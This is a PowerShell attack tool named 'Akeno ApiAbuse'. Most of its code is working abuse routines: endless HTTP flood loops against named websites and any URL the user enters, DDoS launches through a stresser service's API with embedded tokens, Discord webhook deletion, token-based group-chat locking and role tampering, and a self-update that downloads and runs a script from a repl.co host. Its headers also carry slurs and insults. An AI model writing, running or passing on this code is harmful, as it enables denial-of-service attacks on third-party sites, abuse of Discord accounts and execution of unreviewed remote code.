#wont be updating on the github lul
#just run this it will update itself :)

0x00;
$app = @{
version = 1.8
endpoint = Invoke-RestMethod -Uri https://pwshll-abuse.6nkx.repl.co/d/version.txt
}

if($app.endpoint -eq $app.version){}else{
Start-Process powershell{

Invoke-WebRequest https://pwshll-abuse.6nkx.repl.co/d/apiabuse.ps1 | Set-Content ./apiabuse.ps1
Start-Process powershell {./apiabuse.ps1}

}
}



function help($x){

   Write-Host 'Commands for Akenos ApiAbuse:' 
   Write-Host '  WebD: Deletes Webhook (Discord webhook)  '
   Write-Host '  Lgc: Locks Discord gc (in beta for ps1)  '
   Write-Host '  UbeoMass: Http Flood Ubeo.com Email checker'
   Write-Host '  XvideoMass: Http Flood xvideo ip stealer '
   Write-Host '  Creds: Opens credits menu                '
   Write-Host '  apiflood: http flood attack method post to random api '
   Write-Host '  apigetflood: http flood attack method get to url      '
   Write-Host '  Cabuse: in beta console abuse for discord rtc server  '
   Write-Host '  iplookup: uses requests to get get ip info              '
   Write-Host '  imgscrape: scrapes all images on a webpage              '
   Write-Host '  --updates: Shows all updates for version                '
   Write-Host '  Ddos: Will DDos layer7/layer4/layer3                    '
   Write-Host '  pchange: shws rndm alphanumeric pass then shows you it  '
   Write-Host '  dnsc: dns to ip address (dont include http/https)       '
   Write-Host '  trace: traces ip/dns                                    '
   Write-Host '  update: automatically updates the apiabuse              '
   Write-Host '  troll cmds: does lul cmds cus lulz :)))                 '
   $GoToMain = Read-Host 'Press 1 to go to main menu and 0 to exit'
   if($GoToMain -eq 1){Main}else{exit}

}
function updates(){
Write-Host 'Updates for beta version 1.1: Added clients and img scrape        '
Write-Host 'Updates for beta version 1.2: Added Ddos for layer7/layer4/layer3 '
Write-Host 'Updates for beta version 1.3: Added New ui,console abuse update '
Write-Host 'Updates for beta version 1.4: Added password gen,input fixes, removed email cmds '
Write-Host 'Updates for beta version 1.5: Added dns to ip address, changed `--updates and removed %`'
Write-Host 'Updates for Beta version 1.6: Added tracerroute for dns/ip address'
Write-Host 'Updates for Beta version 1.7: Added update for auto updating Apiabuse'
Write-Host 'Updates for Beta version 1.8: Added troll command                    '
$GoToMain = Read-Host 'Press 1 to go to main menu and 0 to exit'
if($GoToMain -eq 1){Main}else{exit}
}

Function Get-RandomAlphanumericString {
	
	[CmdletBinding()]
	Param (
        [int] $length = 8
	)

	Begin{
	}

	Process{
        Write-Output ( -join ((0x30..0x39) + ( 0x41..0x5A) + ( 0x61..0x7A) | Get-Random -Count $length  | % {[char]$_}) )
	}	
}






function WebHookDel($web){
 $host.UI.RawUI.WindowTitle = 'Akeno ApiAbuse | Webhook Deleter'
 Invoke-WebRequest -Method Delete -Uri $web
 Main
}

function lock($auth,$grcid){
$host.UI.RawUI.WindowTitle = 'Akeno ApiAbuse | GcLocker'
$api = "https://discordapp.com/api/v8/channels/"
$gcid = $grcid
$end = '/recipients/1337?'
$headers = $auth
while(1-eq1){$req = Invoke-WebRequest -Method Put -Uri $api$gcid$end$headers}
}


function Email($Fromm,$TOO,$Subject){
Send-MailMessage -From $Fronm -To $TOO -Subject $Subject
}



function ubeopost(){
$host.UI.RawUI.WindowTitle = 'Akeno ApiAbuse | UbeoMassPost'
while(1-eq 1){
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.UserAgent = "Treesec LOL"
Invoke-WebRequest -UseBasicParsing -Uri "https://forms.hsforms.com/emailcheck/v1/json-ext?portalId=516382&includeFreemailSuggestions=true" `
-Method "POST" `
-WebSession $session `
-Headers @{
"authority"="forms.hsforms.com"
  "method"="POST"
  "path"="/emailcheck/v1/json-ext?portalId=516382&includeFreemailSuggestions=true"
  "scheme"="https"
  "accept"="application/json, text/javascript"
  "accept-encoding"="gzip, deflate, br"
  "accept-language"="en-US,en;q=0.9"
  "dnt"="1"
  "origin"="https://www.ubeo.com"
  "referer"="https://www.ubeo.com/"
  "sec-ch-ua"="we love da trees"
  "sec-ch-ua-mobile"="?0"
  "sec-ch-ua-platform"="`"Windows`""
  "sec-fetch-dest"="empty"
  "sec-fetch-mode"="cors"
  "sec-fetch-site"="cross-site"
} `
-ContentType "application/json" `
-Body "whomatters@gmail.com"
}
}


function xvideoflood(){
$host.UI.RawUI.WindowTitle = 'Akeno ApiAbuse | Xvideo Flooder'
while(1-eq1){
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.UserAgent = "treesec runs you"
Invoke-WebRequest -UseBasicParsing -Uri "https://www.xvideos.com/picserror/----/-/0/1" `
-Method "POST" `
-WebSession $session `
-Headers @{
"Accept"="*/*"
  "Accept-Encoding"="gzip, deflate, br"
  "Accept-Language"="en-US,en;q=0.9"
  "Origin"="https://www.xvideos.com"
  "Referer"="https://www.xvideos.com/"
  "Sec-Fetch-Dest"="empty"
  "Sec-Fetch-Mode"="cors"
  "Sec-Fetch-Site"="same-origin"
  "sec-ch-ua"="get flooded"
  "sec-ch-ua-mobile"="?1"
  "sec-ch-ua-platform"="`"Android`""
} `
-ContentType "application/x-www-form-urlencoded" `
-Body "gentime=werunyou&ip=stoptryingtologxsint"
}
}

function Creds(){
 cls
 $host.UI.RawUI.WindowTitle = 'Akeno ApiAbuse | Credits'
 Write-Host ' ________                               ______                      ' -ForegroundColor Green
 Write-Host '|        \                             /      \                     ' -ForegroundColor Green
 Write-Host ' \$$$$$$$$______    ______    ______  |  $$$$$$\  ______    _______ ' -ForegroundColor Green
 Write-Host '   | $$  /      \  /      \  /      \ | $$___\$$ /      \  /       \' -ForegroundColor Green
 Write-Host '   | $$ |  $$$$$$\|  $$$$$$\|  $$$$$$\ \$$    \ |  $$$$$$\|  $$$$$$$' -ForegroundColor Green
 Write-Host '   | $$ | $$   \$$| $$    $$| $$    $$ _\$$$$$$\| $$    $$| $$      ' -ForegroundColor Green
 Write-Host '   | $$ | $$      | $$$$$$$$| $$$$$$$$|  \__| $$| $$$$$$$$| $$_____ ' -ForegroundColor Green
 Write-Host '   | $$ | $$       \$$     \ \$$     \ \$$    $$ \$$     \ \$$     \' -ForegroundColor Green
 Write-Host '    \$$  \$$        \$$$$$$$  \$$$$$$$  \$$$$$$   \$$$$$$$  \$$$$$$$' -ForegroundColor Green
 Write-Host '                                                                    '
 Write-Host 'Made By Xsint & 0x00'
 Write-Host '                    '
 Write-Host 'Honorable Mentions: Xtc Viktor,Retromane'
 Write-Host '                    '
 $GoToMain = Read-Host 'Press 1 to go to main menu and 0 to exit'
 if($GoToMain -eq 1){Main}else{exit}
}



function Main(){


 $host.UI.RawUI.WindowTitle = 'Akeno ApiAbuse'
 $cin = Read-Host root@ApiAbuse~#('')
 if($cin -eq 'WebD' -or $cin -eq 'Lgc' -or $cin -eq 'UbeoMass' -or $cin -eq 'XvideoMass' -or $cin -eq 'Creds'-or $cin -eq 'apiflood' -or $cin -eq 'pinkflood' -or $cin -eq 'apigetflood' -or $cin -eq '--help' -or $cin -eq 'Cabuse' -or $cin -eq 'iplookup' -or $cin -eq 'imgscrape' -or $cin -eq '--updates' -or $cin -eq 'Ddos' -or $cin -eq 'pchange' -or $cin -eq 'dnsc' -or $cin -eq 'trace' -or $cin -eq 'update' -or $cin -eq 'updates' -or $cin -eq 'help' -or $cin -eq 'pchange1' -or $cin -eq 'troll cmds')
 {
  if($cin -eq 'WebD'){
   $webd = Read-Host [*]('Webhook')
   WebHookDel($webd)
   }
  if($cin -eq 'Lgc'){
   $authorization = Read-Host "token >>"
    echo 'just so you know once you run put it will run awhile loop'
   $gcr = Read-Host "Gcid:"
   lock($authorization,$gcr)
   }
  if($cin -eq 'UbeoMass'){
   ubeopost
  }
  if($cin -eq 'XvideoMass'){
   xvideoflood
  }
  if($cin -eq 'Creds'){
   Creds
   }



   if($cin -eq "apiflood"){
    $base = Read-Host [?]('Clientbased or normal? (n/c)')
   if($base -eq 'c'){
   $howmuchclients = Read-Host [?]("clients to be opend")
   for($i=0; $i -lt $howmuchclients; $i++){
    Start-Process powershell {
    $zapiurl = Read-Host [?]('URL')
     $headl = @{
      treesec = "we run u"
       ip = "cant find shit LOL"
       dacmyheader = "accept my headers bitch ass nigga"
       body = "lol"
       name = "shithead"
        content = "random xsint runs u"
       treesecLOL = ('zionbtw who is that?','omg null?','xtc was here','POLARIS BOTNET?')
    
     }
   while(1-eq1){Invoke-WebRequest -Method Post -Uri $zapiurl -Headers $headl}
    
    
    }
    }
   }if($base -eq 'n'){
       $zapiurl = Read-Host [?]('URL')
     $headl = @{
      treesec = "we run u"
       ip = "cant find shit LOL"
       dacmyheader = "accept my headers bitch ass nigga"
       body = "lol"
       name = "shithead"
        content = "random xsint runs u"
       treesecLOL = ('zionbtw who is that?','omg null?','xtc was here','POLARIS BOTNET?')
    
     }
   while(1-eq1){Invoke-WebRequest -Method Post -Uri $zapiurl -Headers $headl}
   }
   
   }
  if($cin -eq '--help'){
    help('e')
  }
  if($cin -eq 'help'){
    help
  }
  if($cin -eq 'updates'){
   updates
  }
  if($cin -eq 'pinkflood'){
   while(1-eq1){
   $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
   $session.UserAgent = "treesec was here."
   $session.Cookies.Add((New-Object System.Net.Cookie("secure_customer_sig", "", "/", "thepinksauce.com")))
   Invoke-WebRequest -UseBasicParsing -Uri "https://thepinksauce.com/account/login" `
   -Method "POST" `
   -WebSession $session `
   -Headers @{
   "authority"="thepinksauce.com"
     "method"="POST"
     "path"="/account/login"
     "scheme"="https"
     "accept"="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
     "accept-encoding"="gzip, deflate, br"
     "accept-language"="en-US,en;q=0.9"
     "cache-control"="max-age=0"
     "origin"="https://thepinksauce.com"
     "referer"="https://thepinksauce.com/"
     "sec-ch-ua"="posion monkeys"
     "sec-ch-ua-mobile"="?0"
     "sec-ch-ua-platform"="`"Windows`""
     "sec-fetch-dest"="document"
     "sec-fetch-mode"="navigate"
     "sec-fetch-site"="same-origin"
     "sec-fetch-user"="?1"
     "upgrade-insecure-requests"="1"
 } `
 -ContentType "application/x-www-form-urlencoded" `
 -Body "form_type=customer_login&utf8=%E2%9C%93&customer%5Bemail%5D=2b2f753e-0c35-41d9-a691-47c8073f26cb%40email.webhook.site&customer%5Bpassword%5D=e&recaptcha-v3-token=03ANYolqslGDcjmMqBGpyc2e-g-lUIuZ5xqhmbx31_EcKcp6wQ0v0a0tLXBxLFfTNju5HibvHx6dSgmMJELLQDj3wwZZ6DgK8Pn49Rch1j-sv0oMBoxV3rXcwvmYLmmISbnjpfrshbHImqfSnPDIbimOEvJa80m80GJEMhbxNSXllr-OsMV1usHqZS4-wmJe79w3wWZDrKJ2aneDPY5Z0I0BJ5muV0vTyVjpadkcPpHbQGnpvv-JXq3iZwkmJ1bEZ_uNUlb9PC2cxp3OvnVf-4WZkKxuD13_M-_ireoWZ65LyOEvMIw0ticK4waji95hNk-q7001MfuZvuRust3fH34i-anRbdn_FvOnzboIRXrDwwIOWhnKyNSfmPmwBjijbXJZ_usu6aVss8BoxTzHKiD0YU3sdZRSHKSJ-Iu0WEwTKIEy-afQken66gnSZBd-MHpbjQfiuS4maoYzvL0OxukpRcIxFRfOfn2J2I-GkQ2afrAWGNetucvC2CKRYnfJ33tvkD0oO_1AYR"
 }
  }
  if($cin -eq 'apigetflood'){
   $base = Read-Host [?]('Clientbased or normal? (n/c)')
   if($base -eq 'c'){
   $howmuchclients = Read-Host [?]("clients to be opend")
   for($i=0; $i -lt $howmuchclients; $i++){
    Start-Process powershell {$urllol = Read-Host [*]('Url')
    while(1-eq1){Invoke-WebRequest -Method GET -Uri $urllol}}
    }
   }if($base -eq 'n'){
      $urllol = Read-Host [?]('Url')
      while(1-eq1){Invoke-WebRequest -Method GET -Uri $urllol}
   }
  }
  if($cin -eq 'Cabuse'){
    $name = Read-Host [?]('Role name')
    $guild_id = Read-Host [?]('Guild id')
    $role_id = Read-Host [?]('Role id')
    $auth = Read-Host [?]('Authorization')
    Invoke-WebRequest -Uri "https://discord.com/api/v9/guilds/$guild_id/roles/$role_id" `
-Method "PATCH" `
-Headers @{
"method"="PATCH"
  "authority"="discord.com"
  "scheme"="https"
  "path"="/api/v9/guilds/1004880078993379388/roles/1008079270221971536"
  "x-super-properties"="eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjAuMS45Iiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDQiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTQxNDcxLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="
  "x-discord-locale"="en-US"
  "x-debug-options"="bugReporterEnabled"
  "accept-language"="en-US"
  "authorization"=$auth
  "user-agent"="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.1.9 Chrome/83.0.4103.122 Electron/9.4.4 Safari/537.36"
  "accept"="*/*"
  "origin"="https://discord.com"
  "sec-fetch-site"="same-origin"
  "sec-fetch-mode"="cors"
  "sec-fetch-dest"="empty"
  "referer"="https://discord.com/channels/1004880078993379388/1004880078993379391"
  "accept-encoding"="gzip, deflate, br"
  "cookie"="__dcfduid=56c67760990b11ecbed0b9f40b671523; __sdcfduid=56c67761990b11ecbed0b9f40b6715233d7ff3ce15d2beb13a8bce7a7466d6ddb544bdb25d96a784fa4efcd513aac194; __stripe_mid=afe77433-0c4a-4e52-8b17-57176f108cd0be80e2"
} `
-ContentType "application/json" `
-Body "{`"name`":`"new role`",`"permissions`":`"1071698661185`",`"color`":0,`"hoist`":false,`"mentionable`":false,`"icon`":null,`"unicode_emoji`":null}"
  }
  if($cin -eq 'iplookup'){
  $ip = Read-Host [*]('ip')
  $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.UserAgent = "treesecprotection"

$xd =Invoke-WebRequest -UseBasicParsing -Uri "https://www.whatismyip.com/app.php" `
-Method "POST" `
-WebSession $session `
-Headers @{
"authority"="www.whatismyip.com"
  "method"="POST"
  "path"="/app.php"
  "scheme"="https"
  "accept"="text/html, */*; q=0.01"
  "accept-encoding"="gzip, deflate, br"
  "accept-language"="en-US,en;q=0.9"
  "origin"="https://www.whatismyip.com"
  "referer"="https://www.whatismyip.com/ip-address-lookup/"
  "sec-ch-ua"="xd"
  "sec-ch-ua-mobile"="?0"
  "sec-ch-ua-platform"="`"Windows`""
  "sec-fetch-dest"="empty"
  "sec-fetch-mode"="cors"
  "sec-fetch-site"="same-origin"
  "x-requested-with"="XMLHttpRequest"
} `
-ContentType "application/x-www-form-urlencoded; charset=UTF-8" `
-Body "ip=$ip&action=ip-lookup"
echo $xd.StatusCode
  }
if($cin -eq 'imgscrape'){
 $siteurl = Read-Host [*]('Url')
 $imglol = Invoke-WebRequest -Uri $siteurl
 $imglol.Links
}
if($cin -eq 'dnsc'){
$dns = Read-Host [?]('url')
 [system.net.dns]::gethostaddresses($dns)

 $GoToMain = Read-Host 'Press 1 to go to main menu and 0 to exit'
 if($GoToMain -eq 1){Main}else{exit}
}
if($cin -eq 'update'){
Start-Process powershell{

Invoke-WebRequest https://pwshll-abuse.6nkx.repl.co/d/apiabuse.ps1 | Set-Content ./apiabuse.ps1
Start-Process powershell {./apiabuse.ps1}

}

}
if($cin -eq 'trace'){
$dns = Read-Host [*]('url/ip')
tracert $dns

$GoToMain = Read-Host 'Press 1 to go to main menu and 0 to exit'
if($GoToMain -eq 1){Main}else{exit}
}
if($cin -eq '--updates'){
updates
}


if($cin -eq 'pchange'){
$hm = Read-Host [?]('How much would you like to generate')
$length = Read-Host [?]('length')
for($j=0; $j -lt $hm; $j++){
Get-RandomAlphanumericString -length $length | Tee-Object -variable teeTime
}

}

if($cin -eq 'pchange1'){
$length = Read-Host [?]('length')
Get-RandomAlphanumericString -length $length | Tee-Object -variable teeTime
$GoToMain = Read-Host 'Press 1 to go to main menu and 0 to exit'
if($GoToMain -eq 1){Main}else{exit}
}
if($cin -eq 'troll cmds'){
cls
Write-Host '---------------------'-ForegroundColor Green
Write-Host '|1.Annoying Beep    |'-ForegroundColor Green
Write-Host '|                   |'-ForegroundColor Green
Write-Host '|                   |'-ForegroundColor Green
Write-Host '|                   |'-ForegroundColor Green
Write-Host '|                   |'-ForegroundColor Green
Write-Host '|                   |'-ForegroundColor Green
Write-Host '|                   |'-ForegroundColor Green
Write-Host '---------------------'-ForegroundColor Green
$in = Read-Host '#' #am sad cant change input color :(
if ($in -eq 1){
 for($i=0; $i -lt 999999999; $i++){
 [console]::beep(1000,500)
 }

}


}
if($cin -eq 'Ddos'){
$layertype = Read-Host [?]('Layer7 or layer4/3 ? (l7,l4,l3)')
if($layertype -eq 'l7' -or $layertype -eq 'l4' -or $layertype -eq 'l3'){
 if($layertype -eq 'l3' -or $layertype -eq 'l4'){
$ip = Read-Host [*]('Ip')
$port = Read-Host [*]('Port')
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.UserAgent = "treesec"
Invoke-WebRequest -UseBasicParsing -Uri "https://instant-stresser.com/backend/ajax/attack" `
-Method "POST" `
-WebSession $session `
-Headers @{
"authority"="instant-stresser.com"
  "method"="POST"
  "path"="/backend/ajax/attack"
  "scheme"="https"
  "accept"="application/json, text/javascript, */*; q=0.01"
  "accept-encoding"="gzip, deflate, br"
  "accept-language"="en-US,en;q=0.9"
  "origin"="https://instant-stresser.com"
  "referer"="https://instant-stresser.com/attack"
  "sec-ch-ua"="lulz"
  "sec-ch-ua-mobile"="?0"
  "sec-ch-ua-platform"="`"Windows`""
  "sec-fetch-dest"="empty"
  "sec-fetch-mode"="cors"
  "sec-fetch-site"="same-origin"
  "x-requested-with"="XMLHttpRequest"
} `
-ContentType "application/json" `
-Body "{`"token`":`"2de03a92476e8547cfa5b3a036e711eb`",`"action`":`"send`",`"attack_target`":`$ip`,`"attack_time`":`"300`",`"attack_port`":`$port`,`"attack_method`":`"FREELDAP`",`"simultaneous_attacks`":`"10`",`"request_method`":`"`",`"post_data`":`"`",`"user_agent`":`"`",`"custom_ua`":`"`",`"attack_origin`":`"`",`"more_headers`":`"`",`"cookies`":`"`",`"referrer`":`"`",`"host_header`":`"`"}"

}
if($layertype -eq 'l7'){
$http = Read-Host [?]('website')
$session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$session.UserAgent = "xdlulz"
Invoke-WebRequest -UseBasicParsing -Uri "https://instant-stresser.com/backend/ajax/attack" `
-Method "POST" `
-WebSession $session `
-Headers @{
"authority"="instant-stresser.com"
  "method"="POST"
  "path"="/backend/ajax/attack"
  "scheme"="https"
  "accept"="application/json, text/javascript, */*; q=0.01"
  "accept-encoding"="gzip, deflate, br"
  "accept-language"="en-US,en;q=0.9"
  "origin"="https://instant-stresser.com"
  "referer"="https://instant-stresser.com/attack"
  "sec-ch-ua"="treesecurity"
  "sec-ch-ua-mobile"="?0"
  "sec-ch-ua-platform"="`"Windows`""
  "sec-fetch-dest"="empty"
  "sec-fetch-mode"="cors"
  "sec-fetch-site"="same-origin"
  "x-requested-with"="XMLHttpRequest"
} `
-ContentType "application/json" `
-Body "{`"token`":`"b8ed257b3d17a66e5115421fa983cfbe`",`"action`":`"send`",`"attack_target`":$http,`"attack_time`":`"300`",`"attack_port`":{},`"attack_method`":`"FREEHTTP`",`"simultaneous_attacks`":`"1`",`"request_method`":`"GET`",`"post_data`":`"`",`"user_agent`":`"all`",`"custom_ua`":`"`",`"more_headers`":`"`",`"cookies`":`"`",`"referrer`":`"`",`"host_header`":`"`",`"threads`":`"1`"}"
}
}}
 }
  } #else{return 'couldnt detect the option please try again'}          #doesnt wanna work because powershell is retarded 

main

